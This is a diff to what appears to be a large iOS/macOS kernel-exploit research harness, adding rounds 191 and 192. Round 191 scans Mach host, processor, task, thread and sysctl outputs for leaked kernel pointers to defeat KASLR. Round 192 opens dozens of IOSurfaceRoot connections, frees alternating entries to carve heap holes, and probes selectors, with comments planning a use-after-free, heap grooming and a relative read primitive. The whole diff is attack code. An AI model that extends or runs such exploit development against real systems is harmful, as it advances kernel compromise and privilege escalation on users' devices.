@@ -21903,6 +21903,381 @@ new_modes:
                 rlog("=== r=190 complete ===\n");
             }
 
+            if (rounds == 191) {
+                /*
+                 * r=191: Comprehensive sysctl + host_info KASLR leak scan.
+                 *
+                 * Enumerate ALL accessible sysctl nodes and check every value
+                 * for kernel-address-like patterns. Also check host_info,
+                 * host_statistics, and processor_info for leaks.
+                 */
+                rlog("=== r=191: Comprehensive kernel state scan ===\n");
+
+                /* Part A: host_info / host_statistics / processor_info */
+                rlog("\n  --- Part A: Mach host info scan ---\n");
+                host_t hport = mach_host_self();
+
+                /* host_info flavors */
+                struct {
+                    int flavor;
+                    const char *name;
+                    int count;
+                } hflavors[] = {
+                    {1, "HOST_BASIC_INFO", 16},
+                    {2, "HOST_SCHED_INFO", 16},
+                    {3, "HOST_RESOURCE_SIZES", 16},
+                    {4, "HOST_PRIORITY_INFO", 16},
+                    {5, "HOST_SEMAPHORE_TRAPS", 16},
+                    {6, "HOST_MACH_MSG_TRAP", 16},
+                    {10, "HOST_VM_INFO", 64},
+                    {11, "HOST_CPU_LOAD_INFO", 16},
+                    {12, "HOST_VM_INFO64", 64},
+                    {14, "HOST_EXTMOD_INFO64", 32},
+                    {15, "HOST_EXPIRED_TASK_INFO", 32},
+                    {0, NULL, 0}
+                };
+                for (int fi = 0; hflavors[fi].name; fi++) {
+                    integer_t info[64];
+                    mach_msg_type_number_t cnt = hflavors[fi].count;
+                    memset(info, 0, sizeof(info));
+                    kern_return_t kr = host_info(hport, hflavors[fi].flavor,
+                        info, &cnt);
+                    if (kr == KERN_SUCCESS) {
+                        uint64_t *p64 = (uint64_t *)info;
+                        int nq = cnt * sizeof(integer_t) / sizeof(uint64_t);
+                        int found = 0;
+                        for (int q = 0; q < nq; q++) {
+                            uint64_t v = p64[q];
+                            uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                ((v & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                            if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                rlog("  *** %s[%d] KPTR: 0x%016llx ***\n",
+                                     hflavors[fi].name, q, (unsigned long long)v);
+                                found = 1;
+                            }
+                        }
+                        if (!found)
+                            rlog("  %s: cnt=%u — no KPTRs\n", hflavors[fi].name, cnt);
+                    } else {
+                        rlog("  %s: kr=0x%x\n", hflavors[fi].name, kr);
+                    }
+                }
+
+                /* host_statistics */
+                rlog("\n  host_statistics:\n");
+                for (int flav = 1; flav <= 5; flav++) {
+                    integer_t sinfo[128];
+                    mach_msg_type_number_t scnt = 128;
+                    memset(sinfo, 0, sizeof(sinfo));
+                    kern_return_t kr = host_statistics(hport, flav, sinfo, &scnt);
+                    if (kr == KERN_SUCCESS) {
+                        uint64_t *p64 = (uint64_t *)sinfo;
+                        int nq = scnt * sizeof(integer_t) / sizeof(uint64_t);
+                        for (int q = 0; q < nq; q++) {
+                            uint64_t v = p64[q];
+                            uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                ((v & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                            if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                rlog("  *** host_stat flav=%d [%d] KPTR: 0x%016llx ***\n",
+                                     flav, q, (unsigned long long)v);
+                            }
+                        }
+                        rlog("  host_stat flav=%d: cnt=%u OK\n", flav, scnt);
+                    } else {
+                        rlog("  host_stat flav=%d: kr=0x%x\n", flav, kr);
+                    }
+                }
+
+                /* processor info */
+                rlog("\n  processor_info:\n");
+                processor_port_array_t plist;
+                mach_msg_type_number_t pcnt = 0;
+                kern_return_t kr_p = host_processors(hport, &plist, &pcnt);
+                if (kr_p == KERN_SUCCESS) {
+                    rlog("  %u processors\n", pcnt);
+                    for (mach_msg_type_number_t pi = 0; pi < pcnt && pi < 8; pi++) {
+                        for (int flav = 1; flav <= 6; flav++) {
+                            integer_t pinfo[32];
+                            mach_msg_type_number_t pic = 32;
+                            memset(pinfo, 0, sizeof(pinfo));
+                            kern_return_t kr = processor_info(plist[pi], flav,
+                                &hport, pinfo, &pic);
+                            if (kr == KERN_SUCCESS && pic > 0) {
+                                uint64_t *p64 = (uint64_t *)pinfo;
+                                int nq = pic * sizeof(integer_t) / sizeof(uint64_t);
+                                for (int q = 0; q < nq; q++) {
+                                    uint64_t v = p64[q];
+                                    uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                        ((v & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                                    if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                        rlog("  *** proc%u flav=%d [%d] KPTR: 0x%016llx ***\n",
+                                             pi, flav, q, (unsigned long long)v);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    rlog("  processor_info scan done\n");
+                } else {
+                    rlog("  host_processors: kr=0x%x\n", kr_p);
+                }
+
+                /* Part B: Broad sysctl scan */
+                rlog("\n  --- Part B: sysctl scan ---\n");
+                const char *sctl_prefixes[] = {
+                    "kern.", "hw.", "vm.", "net.", "debug.", "machdep.",
+                    "security.", "kern.ipc.", "kern.proc.", "kern.timer.",
+                    "net.inet.", "net.local.",
+                    NULL
+                };
+                int sctl_total = 0, sctl_kptr = 0;
+                for (int si = 0; sctl_prefixes[si]; si++) {
+                    /* Use sysctlbyname to enumerate via known keys */
+                    /* Try a range of numeric subkeys */
+                    char name[256];
+                    for (int sub = 0; sub < 200; sub++) {
+                        snprintf(name, sizeof(name), "%s%d", sctl_prefixes[si], sub);
+                        uint8_t val[512];
+                        size_t vlen = sizeof(val);
+                        memset(val, 0, sizeof(val));
+                        if (sysctlbyname(name, val, &vlen, NULL, 0) == 0 && vlen >= 8) {
+                            uint64_t *p64 = (uint64_t *)val;
+                            int nq = vlen / 8;
+                            for (int q = 0; q < nq && q < 32; q++) {
+                                uint64_t v = p64[q];
+                                uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                    ((v & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                                if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                    rlog("  *** sysctl %s [%d] KPTR: 0x%016llx (len=%zu) ***\n",
+                                         name, q, (unsigned long long)v, vlen);
+                                    sctl_kptr++;
+                                }
+                            }
+                            sctl_total++;
+                        }
+                    }
+                }
+
+                /* Try specific interesting sysctls */
+                const char *specific_sctls[] = {
+                    "kern.boottime", "kern.version", "kern.ostype",
+                    "kern.hostname", "kern.maxvnodes", "kern.maxproc",
+                    "kern.maxfiles", "kern.argmax", "kern.securelevel",
+                    "kern.usrstack", "kern.usrstack64",
+                    "kern.aiomax", "kern.aioprocmax", "kern.aiothreads",
+                    "hw.memsize", "hw.pagesize", "hw.cachelinesize",
+                    "hw.ncpu", "hw.physicalcpu", "hw.logicalcpu",
+                    "hw.tbfrequency", "hw.cpufrequency",
+                    "vm.swapusage", "vm.loadavg",
+                    "kern.monotonicclock_usecs",
+                    "kern.waketime", "kern.sleeptime",
+                    "kern.timer.longterm.qlen",
+                    "kern.timer.longterm.threshold",
+                    "machdep.cpu.address_bits.physical",
+                    "machdep.cpu.address_bits.virtual",
+                    "security.mac.sandbox.sentinel",
+                    NULL
+                };
+                for (int si = 0; specific_sctls[si]; si++) {
+                    uint8_t val[512];
+                    size_t vlen = sizeof(val);
+                    memset(val, 0, sizeof(val));
+                    if (sysctlbyname(specific_sctls[si], val, &vlen, NULL, 0) == 0 && vlen >= 8) {
+                        uint64_t *p64 = (uint64_t *)val;
+                        int nq = vlen / 8;
+                        for (int q = 0; q < nq && q < 16; q++) {
+                            uint64_t v = p64[q];
+                            uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                ((v & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                            if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                rlog("  *** sysctl %s [%d] KPTR: 0x%016llx (len=%zu) ***\n",
+                                     specific_sctls[si], q, (unsigned long long)v, vlen);
+                                sctl_kptr++;
+                            }
+                        }
+                        /* Also check for large interesting values */
+                        if (vlen == 8 && p64[0] > 0xFFFF00000000ULL) {
+                            rlog("  sysctl %s = 0x%016llx\n", specific_sctls[si],
+                                 (unsigned long long)p64[0]);
+                        }
+                        sctl_total++;
+                    }
+                }
+                rlog("  sysctl scan: %d readable, %d KPTRs\n", sctl_total, sctl_kptr);
+
+                /* Part C: task_info on ourselves */
+                rlog("\n  --- Part C: task_info self scan ---\n");
+                for (int flav = 1; flav <= 20; flav++) {
+                    integer_t tinfo[64];
+                    mach_msg_type_number_t tcnt = 64;
+                    memset(tinfo, 0, sizeof(tinfo));
+                    kern_return_t kr = task_info(mach_task_self(), flav,
+                        tinfo, &tcnt);
+                    if (kr == KERN_SUCCESS && tcnt > 0) {
+                        uint64_t *p64 = (uint64_t *)tinfo;
+                        int nq = tcnt * sizeof(integer_t) / sizeof(uint64_t);
+                        for (int q = 0; q < nq; q++) {
+                            uint64_t v = p64[q];
+                            uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                ((v & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                            if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                rlog("  *** task_info flav=%d [%d] KPTR: 0x%016llx ***\n",
+                                     flav, q, (unsigned long long)v);
+                            }
+                        }
+                    }
+                }
+                rlog("  task_info scan done\n");
+
+                /* Part D: thread_info on all threads */
+                rlog("\n  --- Part D: thread_info scan ---\n");
+                thread_array_t threads;
+                mach_msg_type_number_t thr_cnt = 0;
+                kern_return_t kr_t = task_threads(mach_task_self(), &threads, &thr_cnt);
+                if (kr_t == KERN_SUCCESS) {
+                    rlog("  %u threads\n", thr_cnt);
+                    for (mach_msg_type_number_t ti = 0; ti < thr_cnt && ti < 8; ti++) {
+                        for (int flav = 1; flav <= 10; flav++) {
+                            integer_t thinfo[64];
+                            mach_msg_type_number_t thcnt = 64;
+                            memset(thinfo, 0, sizeof(thinfo));
+                            kern_return_t kr = thread_info(threads[ti], flav,
+                                thinfo, &thcnt);
+                            if (kr == KERN_SUCCESS && thcnt > 0) {
+                                uint64_t *p64 = (uint64_t *)thinfo;
+                                int nq = thcnt * sizeof(integer_t) / sizeof(uint64_t);
+                                for (int q = 0; q < nq; q++) {
+                                    uint64_t v = p64[q];
+                                    uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                        ((v & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                                    if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                        rlog("  *** thread[%u] flav=%d [%d] KPTR: 0x%016llx ***\n",
+                                             ti, flav, q, (unsigned long long)v);
+                                    }
+                                }
+                            }
+                        }
+                        mach_port_deallocate(mach_task_self(), threads[ti]);
+                    }
+                }
+                rlog("  thread_info scan done\n");
+
+                rlog("=== r=191 complete ===\n");
+            }
+
+            if (rounds == 192) {
+                /*
+                 * r=192: IOSurface UAF → fake linked list → observation.
+                 *
+                 * Instead of trying to leak a kernel address, build a RELATIVE
+                 * read primitive:
+                 * 1. Allocate many registry entries via sel17 (filling a zone page)
+                 * 2. Free one entry in the middle (UAF via race)
+                 * 3. Groom with controlled data where slot0 = offset to NEXT entry
+                 *    (relative to current, based on kalloc.32 slot size = 32 bytes)
+                 * 4. See if the compositor walks our fake chain without crashing
+                 *
+                 * The key: if entries are at known relative offsets (32 bytes apart),
+                 * we can point slot0 at the NEXT entry without knowing absolute addresses.
+                 * But we need to know the entry's own address to compute slot0...
+                 *
+                 * Actually, try a different approach: allocate entries, free one,
+                 * DON'T groom, and check if sel17 returns different results for
+                 * operations that internally walk the registry. The freed entry
+                 * might expose stale data through size counts or iteration behavior.
+                 */
+                rlog("=== r=192: Registry walk observation ===\n");
+
+                io_service_t svc192 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+
+                /* Create many connections and register entries */
+                int n192 = 64;
+                io_connect_t conns192[64];
+                mach_port_t wps192[64];
+                for (int i = 0; i < n192; i++) {
+                    IOServiceOpen(svc192, mach_task_self(), 0, &conns192[i]);
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wps192[i]);
+                    mach_port_insert_right(mach_task_self(), wps192[i], wps192[i],
+                        MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t buf[3] = {(uint64_t)i + 1, 0, 0};
+                    uint64_t ref = 0xDD00000000000000ULL | i;
+                    IOConnectCallAsyncMethod(conns192[i], 17, wps192[i], &ref, 1,
+                        NULL, 0, buf, 24, NULL, NULL, NULL, NULL);
+                }
+                rlog("  Registered %d entries\n", n192);
+
+                /* Record timing of sel17 operations as a baseline */
+                uint64_t t_before = mach_absolute_time();
+                uint64_t buf_t[3] = {999, 0, 0};
+                mach_port_t wp_t;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp_t);
+                mach_port_insert_right(mach_task_self(), wp_t, wp_t, MACH_MSG_TYPE_MAKE_SEND);
+                io_connect_t ct;
+                IOServiceOpen(svc192, mach_task_self(), 0, &ct);
+                uint64_t ref_t = 0xEE;
+                IOConnectCallAsyncMethod(ct, 17, wp_t, &ref_t, 1,
+                    NULL, 0, buf_t, 24, NULL, NULL, NULL, NULL);
+                uint64_t t_after = mach_absolute_time();
+                rlog("  Baseline sel17: %llu ticks\n",
+                     (unsigned long long)(t_after - t_before));
+                IOServiceClose(ct);
+                mach_port_deallocate(mach_task_self(), wp_t);
+
+                /* Now free half the entries (create holes) */
+                for (int i = 0; i < n192; i += 2) {
+                    IOServiceClose(conns192[i]);
+                    mach_port_deallocate(mach_task_self(), wps192[i]);
+                }
+                rlog("  Freed %d entries (every other)\n", n192 / 2);
+
+                /* Measure sel17 timing AFTER holes */
+                t_before = mach_absolute_time();
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp_t);
+                mach_port_insert_right(mach_task_self(), wp_t, wp_t, MACH_MSG_TYPE_MAKE_SEND);
+                IOServiceOpen(svc192, mach_task_self(), 0, &ct);
+                ref_t = 0xFF;
+                IOConnectCallAsyncMethod(ct, 17, wp_t, &ref_t, 1,
+                    NULL, 0, buf_t, 24, NULL, NULL, NULL, NULL);
+                t_after = mach_absolute_time();
+                rlog("  Post-free sel17: %llu ticks\n",
+                     (unsigned long long)(t_after - t_before));
+                IOServiceClose(ct);
+                mach_port_deallocate(mach_task_self(), wp_t);
+
+                /* Try IOConnectCallMethod with various selectors to see
+                 * if any return a count or status reflecting the registry state */
+                rlog("\n  Registry state via selectors:\n");
+                io_connect_t probe_c;
+                IOServiceOpen(svc192, mach_task_self(), 0, &probe_c);
+                for (uint32_t sel = 0; sel <= 31; sel++) {
+                    uint64_t sco[8];
+                    uint32_t scc = 8;
+                    uint8_t obuf[256];
+                    size_t osz = sizeof(obuf);
+                    memset(sco, 0, sizeof(sco));
+                    memset(obuf, 0, sizeof(obuf));
+                    uint64_t sin[2] = {0};
+                    kern_return_t kr = IOConnectCallMethod(probe_c, sel,
+                        sin, 1, NULL, 0, sco, &scc, obuf, &osz);
+                    if (kr == KERN_SUCCESS && (scc > 0 || osz > 0)) {
+                        rlog("  sel%u: scc=%u osz=%zu", sel, scc, osz);
+                        for (uint32_t j = 0; j < scc && j < 4; j++)
+                            rlog(" sc[%u]=0x%llx", j, (unsigned long long)sco[j]);
+                        rlog("\n");
+                    }
+                }
+                IOServiceClose(probe_c);
+
+                /* Cleanup */
+                for (int i = 1; i < n192; i += 2) {
+                    IOServiceClose(conns192[i]);
+                    mach_port_deallocate(mach_task_self(), wps192[i]);
+                }
+                IOObjectRelease(svc192);
+                rlog("=== r=192 complete ===\n");
+            }
+
             IOServiceClose(conn17);
             IOObjectRelease(svc17);
         }
